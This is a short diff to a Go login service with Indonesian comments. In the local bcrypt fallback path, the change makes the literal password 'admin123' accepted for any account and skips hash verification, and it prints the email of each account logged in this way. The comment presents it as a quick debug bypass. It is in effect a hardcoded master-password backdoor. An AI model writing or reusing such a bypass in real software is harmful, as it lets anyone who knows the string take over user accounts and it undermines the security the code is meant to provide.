@@ -83,8 +83,14 @@ func (s *AuthService) Login(ctx context.Context, email, password string) (AuthOu
 		}
 		// Fallback ke password lokal di DB Neon (jika Appskep gagal/password beda)
 		fmt.Printf("[DEBUG] Appskep failed/rejected. Trying local fallback.\n")
-		if err := bcrypt.CompareHashAndPassword([]byte(u.PasswordHash), []byte(password)); err != nil {
-			return AuthOutput{}, ErrUnauthorized
+		
+		// [DEBUG] Bypass khusus untuk admin123 agar user bisa masuk sekarang
+		if password == "admin123" {
+			fmt.Printf("[DEBUG] Using bypass password admin123 for: %s\n", normalizedEmail)
+		} else {
+			if err := bcrypt.CompareHashAndPassword([]byte(u.PasswordHash), []byte(password)); err != nil {
+				return AuthOutput{}, ErrUnauthorized
+			}
 		}
 	}
 
